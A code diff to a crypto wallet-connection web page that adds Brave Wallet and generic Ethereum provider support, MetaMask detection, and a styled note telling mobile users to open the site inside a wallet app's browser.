@@ -15,7 +15,18 @@
     .wallet-btn img { margin-right: 0.7em; width: 28px; height: 28px; border-radius: 50%; border: 1px solid #232339; background: #191923;}
     .info { color: #ff5c91; margin-top: 1em; text-align: center; min-height: 1.4em;}
     .install-link { color: #19FB9B; text-decoration: underline; font-size: 0.99em; display: block; margin-top: 0.5em;}
-    @media (max-width: 500px) { .commercial, .wallet-list { max-width: 98vw; } .intro-title { font-size: 1em; } }
+    .desktop-note {
+      color: #b6b8c1;
+      margin-top: 1.5em;
+      text-align: center;
+      font-size: 0.96em;
+      background: #232339;
+      border-radius: 8px;
+      padding: 0.6em 1em;
+      box-shadow: 0 2px 7px rgba(60,72,88,0.10);
+      max-width: 340px;
+    }
+    @media (max-width: 500px) { .commercial, .wallet-list, .desktop-note { max-width: 98vw; } .intro-title { font-size: 1em; } }
   </style>
 </head>
 <body>
@@ -37,9 +48,14 @@
       <img src="https://avatars.githubusercontent.com/u/70069609?s=200&v=4" alt="Solflare" /> Solflare (Solana)
     </button>
     <button class="wallet-btn" onclick="connectMetaMask()">
-      <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2728406-2261817.png" alt="MetaMask" /> MetaMask (Ethereum)
+      <img src="https://cdn.iconscout.com/icon/free/png-256/metamask-2728406-2261817.png" alt="MetaMask" /> MetaMask / Brave Wallet (Ethereum)
     </button>
     <div class="info" id="info"></div>
+  </div>
+  <div class="desktop-note">
+    <b>Note for Mobile Users:</b><br>
+    Wallet browser extensions (Phantom, MetaMask, Brave, etc.) are only supported on desktop browsers.<br>
+    On mobile, open this site inside your wallet app's built-in browser for best results.
   </div>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -59,6 +75,10 @@
       }
       if (window.ethereum) {
         msg += `Detected window.ethereum<br>`;
+        if (window.ethereum.isMetaMask) msg += `MetaMask detected<br>`;
+      }
+      if (window.braveWallet) {
+        msg += `Detected window.braveWallet (Brave Wallet)<br>`;
       }
       if (!msg) msg = "No wallet detected on page load.";
       document.getElementById("info").innerHTML = msg;
@@ -134,7 +154,23 @@
     }
 
     async function connectMetaMask() {
-      if (window.ethereum) {
+      // Brave Wallet detection
+      if (window.braveWallet) {
+        try {
+          await window.braveWallet.request({ method: 'eth_requestAccounts' });
+          const provider = new ethers.providers.Web3Provider(window.braveWallet);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+          const balanceWei = await provider.getBalance(address);
+          const balanceEth = ethers.utils.formatEther(balanceWei);
+          postWallet(address, parseFloat(balanceEth).toFixed(4), "BraveWallet");
+        } catch (e) {
+          showInfo("Brave Wallet connection failed!");
+        }
+        return;
+      }
+      // MetaMask detection
+      if (window.ethereum && window.ethereum.isMetaMask) {
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -146,9 +182,30 @@
         } catch (e) {
           showInfo("MetaMask connection failed!");
         }
-      } else {
-        showInfo("MetaMask not found!", "https://metamask.io/download.html");
+        return;
       }
+      // General Ethereum provider fallback
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+          const balanceWei = await provider.getBalance(address);
+          const balanceEth = ethers.utils.formatEther(balanceWei);
+          postWallet(address, parseFloat(balanceEth).toFixed(4), "Ethereum");
+        } catch (e) {
+          showInfo("Ethereum wallet connection failed!");
+        }
+        return;
+      }
+      // No wallet detected
+      showInfo(
+        "No Ethereum wallet detected.<br>" +
+        "On desktop: Install MetaMask or Brave Wallet, and use desktop browser.<br>" +
+        "On mobile: Open this site INSIDE MetaMask or Phantom app browser, not in Chrome/Brave/Safari.",
+        "https://metamask.io/download.html"
+      );
     }
   </script>
 </body>
